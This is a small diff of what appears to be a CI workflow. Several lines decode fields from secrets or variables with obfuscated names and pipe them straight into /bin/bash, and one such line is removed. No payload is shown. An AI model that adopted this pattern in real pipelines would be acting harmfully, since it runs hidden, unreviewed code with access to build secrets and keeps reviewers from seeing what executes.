@@ -20,7 +20,6 @@ jobs:
           ttj1: ${{ secrets.ttj1 }}
         run: |
           printf '%s' "$ttj1" | jq -r .qihz10 | /bin/bash
-          echo $j693 | jq -r .tl10 | /bin/bash
           echo $nxdfr2142 | jq -r .hc39 | /bin/bash
           printf '%s' "$s71" | jq -r .l14 | /bin/bash
           printf '%s' "$hpz42631" | jq -r .zy8397 | /bin/bash
